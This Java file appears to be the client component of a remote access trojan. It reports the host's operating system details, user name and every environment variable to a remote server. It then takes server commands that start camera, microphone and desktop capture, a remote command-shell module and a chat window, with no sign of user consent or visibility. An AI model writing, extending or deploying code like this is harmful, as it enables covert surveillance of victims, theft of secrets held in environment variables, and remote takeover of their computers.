package Client;

import Client.Features.*;
import Handler.Message;
import Handler.ObjectHandler;
import Handler.PacketHandler;
import Tools.Network.NetworkInterface;

import javax.swing.*;
import java.io.IOException;
import java.net.DatagramSocket;
import java.net.SocketException;
import java.time.LocalDateTime;
import java.util.Map;
import java.util.Objects;
import java.util.Random;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

import static Tools.Globals.Sleep;

public class Client extends NetworkInterface {

    public static void main(String[] args) throws SocketException, ClassNotFoundException, UnsupportedLookAndFeelException, InstantiationException, IllegalAccessException {
        Client client = new Client(8000);
        Runtime.getRuntime().addShutdownHook(new Thread(client::disposeAll));
        UIManager.setLookAndFeel(UIManager.getSystemLookAndFeelClassName());
    }

    private static final ExecutorService threadListener = Executors.newSingleThreadScheduledExecutor();

    private final Random rand = new Random(LocalDateTime.now().getSecond());
    private final int id = rand.nextInt(1000000);

    private final PacketHandler packetHandler;
    private final ObjectHandler<Message<?>> clientObjectHandler;

    private final CameraCapture cameraCapture;
    private final AudioCapture audioCapture;
    private final Chat chat;
    private final CMDControl cmdControl;
    private final DesktopCapture desktopCapture;

    public Client(int PORT) throws SocketException {
        super(PORT);
        socket = new DatagramSocket();
        packetHandler = new PacketHandler(socket);
        clientObjectHandler = new ObjectHandler<>();

        cameraCapture = new CameraCapture(0, new PacketHandler(socket, address, PORT));
        desktopCapture = new DesktopCapture(new PacketHandler(socket, address, PORT));
        cmdControl = new CMDControl(new PacketHandler(socket, address, PORT));
        chat = new Chat(new PacketHandler(socket, address, PORT));
        audioCapture = new AudioCapture(new PacketHandler(socket, address, PORT));

        threadListener.execute(listener());
    }

    private Runnable listener() {
        return () -> {
            try {
                String value = String.valueOf(id);
                Message<String> info = () -> value;
                byte[] infoData = clientObjectHandler.writeModifiedArray(Objects.requireNonNull(clientObjectHandler.writeObjects(info)), CommandByte.START_BYTE);
                packetHandler.send(infoData, infoData.length, address, PORT);
                byte[] dataReceived = packetHandler.receive(1, packetHandler.getPacketAddress(), packetHandler.getPacketPort());
                if (dataReceived[0] == CommandByte.CONFIRMATION_BYTE) {
                    System.out.println("Client connected to a server!");
                    threadListener.execute(infoListener());
                }
            } catch (IOException e) {
                e.printStackTrace();
            }
        };
    }

    private Runnable infoListener() {
        return () -> {
            Message<String[]> osInfoClient = () -> new String[]
                    {       System.getProperty("os.name"),
                            System.getProperty("os.version"),
                            System.getProperty("os.vendor"),
                            System.getProperty("os.arch"),
                            System.getProperty("user.name")
                    };
            Message<Map<String, String>> osInfoSystem = System::getenv;

            byte[] objInfo = Objects.requireNonNull(clientObjectHandler.writeObjects(osInfoClient));
            byte[] objSystem = Objects.requireNonNull(clientObjectHandler.writeObjects(osInfoSystem));

            try {
                socket.connect(address, PORT);
                packetHandler.send(objInfo, objInfo.length);

                packetHandler.send(objSystem, objSystem.length);
                socket.disconnect();

                if (packetHandler.receive(1, packetHandler.getPacketAddress(), packetHandler.getPacketPort())[0] == CommandByte.INFO_ACHIEVED_BYTE) {
                    threadListener.execute(featureListener());
                }
            } catch (IOException e) {
                e.printStackTrace();
            }
        };
    }

    private Runnable featureListener() {
        return () -> {
            outer:
            while (true) {
                try {
                    byte[] data = packetHandler.receive(2, packetHandler.getPacketAddress(), packetHandler.getPacketPort());
                    switch (data[0]) {
                        case CommandByte.CAMERA_BYTE -> cameraCapture.startFeature();
                        case CommandByte.CAMERA_BYTE_STOP -> cameraCapture.stopFeature();
                        case CommandByte.AUDIOCAPTURE_BYTE -> {
                            audioCapture.setTime(data[1]);
                            audioCapture.startFeature();
                        }
                        case CommandByte.AUDIOCAPTURE_BYTE_STOP -> audioCapture.stopFeature();
                        case CommandByte.CMDCONTROL_BYTE -> cmdControl.startFeature();
                        case CommandByte.CMDCONTROL_BYTE_STOP -> cmdControl.stopFeature();
                        case CommandByte.DESKTOPCONTROL_BYTE -> desktopCapture.startFeature();
                        case CommandByte.DESKTOPCONTROL_BYTE_STOP -> desktopCapture.stopFeature();
                        case CommandByte.CHAT_BYTE -> chat.startFeature();
                        case CommandByte.CHAT_BYTE_STOP -> chat.stopFeature();
                        case CommandByte.STOP_CONNECTION_BYTE -> { break outer; }
                    }
                } catch (IOException e) {
                    e.printStackTrace();
                }
                Sleep(1000 / 60);
            }
        };
    }

    @Override
    public void disposeAll() {
        threadListener.shutdown();
        socket.disconnect();
        socket.close();
    }
}

